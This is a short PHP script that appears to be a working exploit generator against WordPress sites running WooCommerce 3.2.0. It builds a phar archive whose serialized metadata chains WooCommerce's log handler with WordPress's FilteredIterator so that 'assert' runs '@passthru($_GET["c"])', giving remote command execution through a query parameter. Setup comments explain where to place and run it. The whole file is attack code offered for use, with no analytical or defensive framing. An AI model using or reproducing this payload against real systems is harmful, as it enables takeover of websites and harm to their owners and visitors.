<?php
//This script generates the payload and requires a fully functioning wordpress installation with woocommerce
//place it in the root of the wordpress folder
//make a folder called 'files'
//chmod 777 files
//run the script
require('wp-load.php');
require_once( 
	dirname( __FILE__ ). 
	'/wp-content/plugins/woocommerce-3.2.0/includes/log-handlers/class-wc-log-handler-file.php');
require_once( 
	dirname( __FILE__ ). 
	'/wp-includes/Requests/Utility/FilteredIterator.php');

//Array with our command into filteredIterator Object
$arr = array("1" => '@passthru($_GET["c"]);');
$obj_ = new Requests_Utility_FilteredIterator($arr, "assert");


class myClass extends WC_Log_Handler_File{
	protected $wc;
	//Serialise it in metadata
	public function make($handle) {
		echo "test";
		$this->wc = new WC_Log_Handler_File();
		$this->wc->handles = $handle;
		unlink("files/phar.phar");
		$phar = new Phar("files/phar.phar");
		$phar->startBuffering();
		$phar->addFromString("test.txt","test");
		$phar->setStub("<?php __HALT_COMPILER(); ?>");
		$phar->setMetadata($this->wc);
		$phar->stopBuffering();
	}
}

$obj = new myClass();
$obj->make($obj_);
?>
